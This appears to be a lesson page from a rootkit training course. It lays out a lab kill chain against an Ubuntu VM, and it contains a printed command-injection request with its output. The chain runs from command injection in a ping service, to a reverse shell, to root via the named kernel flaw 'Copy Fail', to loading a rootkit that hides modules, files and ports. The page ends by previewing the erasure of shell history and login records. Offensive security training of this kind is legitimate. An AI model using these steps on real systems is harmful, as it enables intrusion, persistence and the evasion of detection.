# D00: Deploy

```
 HOST (attacker)                    VM (target)
 +--------------+                   +------------------+
 |              |   1. curl :8080   | Ubuntu 24.04     |
 |  student     | ----------------> | 6.8.0-101-generic|
 |              |   cmd injection   |                  |
 |              |                   | status-check.py  |
 |              |   2. rev shell    | (student user)   |
 |              | <---------------- |                  |
 |              |                   |                  |
 |              |   3. Copy Fail    |                  |
 |              |   python3 exp.py  | uid=0(root)      |
 |              |                   |                  |
 |              |   4. insmod       |                  |
 |              |   rklings.ko      | rootkit loaded   |
 +--------------+                   +------------------+
```

You built a rootkit.
Now deploy it against a real target.
From the outside.

## The target

The VM runs Ubuntu 24.04 with kernel 6.8.0-101-generic (pre-patch).
A status check service on port 8080 accepts a `host` parameter and runs `ping`.
The service runs as `student` (uid 1000, no sudo).

## Kill chain

### Step 1: Initial access

The service at `http://localhost:8080/?host=...` passes the `host` parameter to a shell command.
Find the injection.
Get a reverse shell as `student`.

### Step 2: Privilege escalation

The kernel is vulnerable to CVE-2026-31431 (Copy Fail).
A 732-byte Python script corrupts `/usr/bin/su` in the page cache via AF_ALG + splice.
Run it, then run `su`.
You are root.

### Step 3: Deploy

Transfer your M01 rootkit (.ko) to the target.
`insmod` it.
Verify: the module is hidden from `lsmod`, your files are hidden from `ls`, your port is hidden from `ss`.

## You write

Nothing.
This exercise is operational, not code.
You execute the kill chain manually.

## Test it

```
$ rklings run D00
  [+] built rklings.ko (M01 reference)
  [*] booting target VM...
  [+] target ready (8080 forwarded to host)

# From another terminal:
$ curl 'http://localhost:8080/?host=localhost'
Status check: localhost
PING localhost ...

# Command injection:
$ curl 'http://localhost:8080/?host=;id'
Status check: ;id
uid=1000(student) ...
```

## Validate

```
$ rklings validate D00
  [+] service reachable on :8080
  [+] command injection confirmed
  [+] Copy Fail escalation confirmed (uid=0)
  [+] module loaded and hidden
  [+] file hiding operational
  [+] port hiding operational
  All checks passed.
```

## Next

You are in.
You are root.
Your rootkit is loaded.
But you left shell history, login records, a binary on disk, and you had to type every command by hand.
Phase 5 fixes all of that.
